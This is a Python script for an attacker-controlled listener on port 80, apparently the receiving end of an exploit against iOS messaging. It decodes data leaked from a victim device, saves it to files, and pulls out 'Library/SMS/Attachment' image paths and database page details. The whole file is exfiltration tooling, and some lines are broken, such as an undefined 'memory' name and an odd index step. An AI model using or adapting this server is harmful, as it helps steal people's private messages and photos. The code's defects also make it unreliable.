import socket
import time

def listen():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    connection.bind(('0.0.0.0', 80))
    connection.listen(10)
    while True:
        current_connection, address = connection.accept()
        while True:
            data = ""
            while data.find("\r\n\r\n") == -1:
                data = data + current_connection.recv(400000)

            if data == 'quit\r\n':
                current_connection.shutdown(1)
                current_connection.close()
                break

            elif data == 'stop\r\n':
                current_connection.shutdown(1)
                current_connection.close()
                exit()

            elif data:
                if(data.find("a12345 ") !=-1):
                    start = data.find("GET")
                    end = data.find("HTTP")
                    str1 = data[start+4 :end-1]
                    l = str1.decode('utf-8').encode('utf-16le')
                    print (memory) + str(len(l[65*2:])) + " bytes"
                    for i in l[65*2:]:
                        print (hex)(ord(i)),
                    print ("")
                    print (l[65*2:])
                if(data.find("retval = ") !=-1):
                    start = data.find("retval = ")+10
                    end = data.rfind("\"")
                    s = ""
                    i = start

                    buf = data[start:end]
                    f=open("buf", 'wb')
                    f.write(buf)
                    f.close()

                    while i < end:
                        if data[i] == '\\' and data[i+1]== 'U':
                            cur_char = data[i+2:i+6]
                            n = int(cur_char[2:], 16)
                            s = s + str(chr(n))
                            n = int(cur_char[0:2], 16)
                            s = s + str(chr(n))
                            i = i + 6
                        elif data[i] == '%':
                            u = ""
                            last = 0
                            while len(data) > i+2 and data[i] != '\\' and data[i+1] != 'U':
                                if data[i] =='%':
                                    try:
                                        c = int(data[i+1:i+3], 16)
                                        i = i + 3
                                        u = u + chr(c)
                                    except:
                                        last = 1
                                        i = i + i
                                else:
                                    u = u + data[i]
                                    i = i + 1
                                    break
                            try:
                                by = u.decode('utf-8').encode('utf-16le')
                            except:
                                by = "BADUTF"
                            s = s + by
                            if last:
                                s = s + '%'
                        else:
                            s = s + data[i] + "\x00"
                            print ("0x00"),
                            i = i + 1

                    print (s[:100])
                    q = s
                    while q.find("Library/SMS/Attachment")!= -1:
                        q = q[q.find("Library/SMS/Attachment"):]
                        p = q[:q.find("jpeg")+4]
                        q = q[len(p):]
                        print (p)

                    f= open("img.jpg", 'wb')
                    f.write(s)
                    f.close()
                    ps = ord(s[17])+ ord(s[16])<<8
                    print ("page size"),
                    print (ps)

                    pn = hex(ord(s[28]))+ hex(ord(s[29]))[2:]+hex(ord(s[30]))[2:]+hex(ord(s[31]))[2:]
                    print (pn)
                u = "FILECONTENTSHERE"
                w = ""
                for item in u:
                    w = w +item
                    w = w + "\x00"
                current_connection.send("HTTP/1.1 200 OK\r\nContent-Length: "+str(len(w))+"\r\nContent-Type: text/html\r\nConnection: Closed\r\n\r\n"+ w +"\r\n")
                current_connection.shutdown(1)
                current_connection.close()
                break


if __name__ == "__main__":
    try:
        listen()
    except KeyboardInterrupt:
        pass
